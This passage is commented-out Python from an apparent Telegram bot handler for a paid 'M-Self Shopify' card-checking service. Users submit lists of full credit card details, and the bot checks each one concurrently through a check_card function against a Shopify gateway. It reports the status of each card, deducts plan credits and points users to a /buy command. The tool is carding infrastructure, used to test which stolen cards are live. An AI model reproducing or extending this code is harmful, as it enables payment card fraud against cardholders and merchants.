#                 f"❌ You can check max {mlimit} cards as per your plan!",
#                 reply_to_message_id=message.id
#             )

#         available_credits = user_data.get("plan", {}).get("credits", 0)
#         card_count = len(all_cards)

#         if available_credits != "∞":
#             try:
#                 available_credits = int(available_credits)
#                 if card_count > available_credits:
#                     return await message.reply(
#                         "<pre>Notification ❗️</pre>\n"
#                         "<b>Message :</b> <code>You Have Insufficient Credits</code>\n"
#                         "<b>Get Credits To Use</b>\n"
#                         "━━━━━━━━━━━━━\n"
#                         "<b>Type <code>/buy</code> to get Credits.</b>",
#                         reply_to_message_id=message.id
#                     )
#             except Exception:
#                 return await message.reply(
#                     "⚠️ Error reading your credit balance.",
#                     reply_to_message_id=message.id
#                 )

#         checked_by = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

#         loader_msg = await message.reply(
#             f"<pre>✦ [$mslf] | M-Self Shopify</pre>"
#             f"<b>[⚬] Gateway -</b> <b>{gateway}</b>\n"
#             f"<b>[⚬] CC Amount : {card_count}</b>\n"
#             f"<b>[⚬] Checked By :</b> {checked_by} [<code>{plan} {badge}</code>]\n"
#             f"<b>[⚬] Status :</b> <code>Processing Request..!</code>\n",
#             reply_to_message_id=message.id
#         )

#         async def handle_card(fullcc):
#             try:
#                 raw_response = await check_card(user_id, fullcc)
#                 status_flag = get_status_flag(raw_response.upper())
#                 return f"• <b>Card :</b> <code>{fullcc}</code>\n" \
#                        f"• <b>Status :</b> <code>{status_flag}</code>\n" \
#                        f"• <b>Result :</b> <code>{raw_response or '-'}</code>\n" \
#                        "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"
#             except Exception as e:
#                 return f"• <b>Card :</b> <code>{fullcc}</code>\n" \
#                        f"• <b>Status :</b> <code>Error ❌</code>\n" \
#                        f"• <b>Result :</b> <code>{e}</code>\n" \
#                        "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"

#         start_time = time.time()

#         tasks = [handle_card(card) for card in all_cards]
#         final_results = await asyncio.gather(*tasks)

#         end_time = time.time()
#         timetaken = round(end_time - start_time, 2)

#         # Deduct credits after processing
#         if user_data["plan"].get("credits") != "∞":
#             loop = asyncio.get_event_loop()
#             await loop.run_in_executor(None, deduct_credit_bulk, user_id, card_count)

#         final_result_text = "\n".join(final_results)

#         await loader_msg.edit(
#             f"<pre>✦ [$mslf] | M-Self Shopify</pre>\n"
#             f"{final_result_text}\n"
#             f"<b>[⚬] T/t :</b> <code>{timetaken}s</code>\n"
#             f"<b>[⚬] Checked By :</b> {checked_by} [<code>{plan} {badge}</code>]\n"
#             f"<b>[⚬] Dev :</b> <a href='https://t.me/Chr1shtopher'>Christopher�</a>",
#             disable_web_page_preview=True
#         )

#     except Exception as e:
#         await message.reply(f"⚠️ Error: {e}", reply_to_message_id=message.id)

#     finally:
#         user_locks.pop(user_id, None)
